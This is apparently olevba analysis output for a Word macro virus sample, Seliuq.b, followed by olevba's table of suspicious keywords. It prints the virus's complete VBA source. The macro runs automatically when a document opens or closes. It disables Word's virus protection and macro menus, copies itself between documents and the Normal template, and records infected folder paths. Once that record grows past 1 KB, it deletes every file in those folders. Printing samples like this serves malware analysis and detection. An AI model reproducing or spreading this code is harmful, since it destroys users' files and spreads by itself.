olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Seliuq.b-85c0398fb5ddc69561c45f2a608133fc11d8ef58
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Aquiles.cls 
in file: Virus.MSWord.Seliuq.b-85c0398fb5ddc69561c45f2a608133fc11d8ef58 - OLE stream: 'Macros/VBA/Aquiles'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
 On Error Resume Next
 If ActiveDocument.VBProject.vbcomponents.Count > 1 Then
 For op = 2 To ActiveDocument.VBProject.vbcomponents.Count
   cantidad = ActiveDocument.VBProject.vbcomponents.Item(op).CodeModule.CountOfLines
   ActiveDocument.VBProject.vbcomponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 If NormalTemplate.VBProject.vbcomponents.Count > 1 Then
 For op = 2 To NormalTemplate.VBProject.vbcomponents.Count
   cantidad = NormalTemplate.VBProject.vbcomponents.Item(op).CodeModule.CountOfLines
   NormalTemplate.VBProject.vbcomponents.Item(op).CodeModule.DeleteLines 1, cantidad
 Next op
 End If
 Document_Close
End Sub
Private Sub Document_Close()
 On Error Resume Next
 CommandBars("Visual Basic").Visible = False
 Options.VirusProtection = False
 CommandBars("Tools").Controls("Macro").Enabled = False
 CommandBars("View").Controls(6).Enabled = False
 CommandBars("tools").Controls(15).Enabled = False
 Set ad = ActiveDocument.VBProject.vbcomponents.Item(1)
 Set nt = NormalTemplate.VBProject.vbcomponents.Item(1)
 If MacroContainer.FullName = ActiveDocument.FullName Then
  If nt.Name <> "Aquiles" Then GoTo ClaudioNormal
 Else
  If ad.Name <> "Aquiles" Then GoTo Aquilesdocument
 End If
GoTo Findelmundo
Aquilesdocument:
 lineas = ad.CodeModule.CountOfLines
 ad.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= nt.CodeModule.CountOfLines
    cadenadecodigo = nt.CodeModule.lines(lineas, 1)
    ad.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 ad.Name = "Aquiles"
 Open "C:\system.Dos" For Append As #1
   Print #1, ActiveDocument.Path
 Close #1
 ActiveDocument.SaveAs ActiveDocument.FullName, wdFormatDocument
GoTo Findelmundo
ClaudioNormal:
 lineas = nt.CodeModule.CountOfLines
 nt.CodeModule.DeleteLines 1, lineas
 lineas = 1
 Do While lineas <= ad.CodeModule.CountOfLines
    cadenadecodigo = ad.CodeModule.lines(lineas, 1)
    nt.CodeModule.insertlines lineas, cadenadecodigo
    lineas = lineas + 1
 Loop
 nt.Name = "Aquiles"
 NormalTemplate.Save
Findelmundo:
If Dir("C:\system.Dos", vbNormal) <> "" Then
If FileLen("C:\system.Dos") > 1024 Then
  Open "C:\system.Dos" For Input As #1
    Do While Not EOF(1)
      Line Input #1, direccion
      Kill (direccion + "\*.*")
    Loop
  Close #1
  Kill ("C:\system.Dos")
  Application.UserName = "Gonzalez"
End If
End If
'Al rio jactancioso, Dios le a puesto un vado. Malinke
'esto es una modificacion, trato de llegar a la perfeccion
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|vbcomponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

